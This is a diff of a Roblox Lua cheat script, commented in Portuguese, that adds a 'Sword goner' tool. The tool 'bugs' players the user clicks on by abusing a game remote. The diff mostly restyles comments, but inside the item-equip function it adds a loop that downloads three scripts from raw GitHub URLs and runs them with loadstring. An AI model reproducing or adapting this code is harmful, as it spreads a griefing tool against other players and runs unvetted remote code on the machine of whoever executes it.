@@ -8,18 +8,18 @@ game:GetService("StarterGui"):SetCore("SendNotification",{
 
 wait(1)
 
--- Serviços
+-- // Serviços
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local RunService = game:GetService("RunService")
 local LocalPlayer = Players.LocalPlayer
 
--- Variáveis
+-- // Variáveis
 local buggedPlayers = {}
 local bugConnections = {}
 local Remote = ReplicatedStorage.RE:FindFirstChild("1Gu1n")
 
--- Criação da Tool
+-- // Criação da Tool
 local tool = Instance.new("Tool")
 tool.Name = "Sword goner"
 tool.RequiresHandle = true
@@ -38,7 +38,7 @@ mesh.MeshType = Enum.MeshType.Sphere
 mesh.Scale = Vector3.new(0.05, 0.05, 0.05)
 handle.Parent = tool
 
--- Função de notificação
+-- // Função de notificação
 local function createNotification(title, message, duration)
     game:GetService("StarterGui"):SetCore("SendNotification",{
         Title = title,
@@ -47,7 +47,7 @@ local function createNotification(title, message, duration)
     })
 end
 
--- Função para aplicar bug em um player
+-- // Função para aplicar bug em um player
 local function bugPlayer(targetPlayer)
     if not Remote then
         createNotification("❌ Erro", "Remote não encontrado!")
@@ -117,7 +117,7 @@ local function bugPlayer(targetPlayer)
     end)
 end
 
--- Detecta player clicado
+-- // Detecta player clicado
 local function getPlayerFromMouse(mouse)
     local target = mouse.Target
     if not target then return nil end
@@ -131,22 +131,34 @@ local function getPlayerFromMouse(mouse)
     return nil
 end
 
--- IDs para equipar
+-- // IDs para equipar (completos e atualizados)
 local itemIDs = {
     17770317484,
+    17772174303,
+    17822722698,
+    17771175724,
     17812415139,
     17812417356,
-    17771175724,
     17822749561,
-    17772174303,
-    892265784,
     892267099,
-    892268340
+    892265784,
+    892268340,
+    11274394350
 }
 
--- Função para equipar itens
+-- // Função para equipar itens
 local function equipItems(list)
+    -- Remove duplicatas automaticamente
+    local seen = {}
+    local uniqueList = {}
     for _, id in ipairs(list) do
+        if not seen[id] then
+            seen[id] = true
+            table.insert(uniqueList, id)
+        end
+    end
+
+    for _, id in ipairs(uniqueList) do
         local success, err = pcall(function()
             ReplicatedStorage:WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(id)
         end)
@@ -157,12 +169,43 @@ local function equipItems(list)
         end
         task.wait(0.3)
     end
+
+    -- // Executa o remote ChangeBodyColor após equipar todos os itens
+    local bodyColorRemote = ReplicatedStorage:WaitForChild("Remotes"):FindFirstChild("ChangeBodyColor")
+    if bodyColorRemote then
+        local args = {
+            [1] = "Really black"
+        }
+        bodyColorRemote:FireServer(unpack(args))
+        print("🎨 Remote ChangeBodyColor executado com sucesso!")
+    else
+        warn("❌ Remote ChangeBodyColor não encontrado!")
+    end
+
+    -- // Executa os 3 scripts externos
+    local externalScripts = {
+        "https://raw.githubusercontent.com/267266273ffsfs/sumir/refs/heads/main/Main.txt",
+        "https://raw.githubusercontent.com/267266273ffsfs/skins/refs/heads/main/Main.txt",
+        "https://raw.githubusercontent.com/267266273ffsfs/audio/refs/heads/main/Main.txt"
+    }
+
+    for _, url in ipairs(externalScripts) do
+        local success, err = pcall(function()
+            loadstring(game:HttpGet(url))()
+        end)
+        if success then
+            print("✅ Script externo carregado: "..url)
+        else
+            warn("⚠️ Falha ao carregar script externo: "..url.." | "..tostring(err))
+        end
+        task.wait(0.3)
+    end
 end
 
--- Equipar tudo ao executar o script
+-- // Equipar tudo ao executar o script
 equipItems(itemIDs)
 
--- Equipar tool
+-- // Equipar tool
 tool.Equipped:Connect(function(mouse)
     local character = tool.Parent
     if character and character:FindFirstChild("Humanoid") and character.Humanoid.RigType == Enum.HumanoidRigType.R15 then
@@ -193,14 +236,14 @@ tool.Equipped:Connect(function(mouse)
     end
 end)
 
--- Desequipar tool → equipa só o item 12866137394
+-- // Desequipar tool → equipa só o item 12866137394
 tool.Unequipped:Connect(function()
     local args = {12866137394}
     game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("Wear"):InvokeServer(unpack(args))
     createNotification("⚔️ sword goner Guardado", "Tool desequipado! Visual restaurado.")
 end)
 
--- Limpeza quando player sai
+-- // Limpeza quando player sai
 Players.PlayerRemoving:Connect(function(player)
     local playerName = player.Name
     if bugConnections[playerName] then
@@ -210,7 +253,7 @@ Players.PlayerRemoving:Connect(function(player)
     buggedPlayers[playerName] = nil
 end)
 
--- Comandos de chat
+-- // Comandos de chat
 LocalPlayer.Chatted:Connect(function(message)
     if message:lower() == "/stopallbugs" then
         for _, connection in pairs(bugConnections) do
@@ -226,6 +269,6 @@ LocalPlayer.Chatted:Connect(function(message)
     end
 end)
 
--- Adiciona tool ao inventário
+-- // Adiciona tool ao inventário
 tool.Parent = LocalPlayer.Backpack
 createNotification("✅ Sword goner Carregado", "Tool adicionada ao inventário! Use /stopallbugs para parar todos os bugs.")
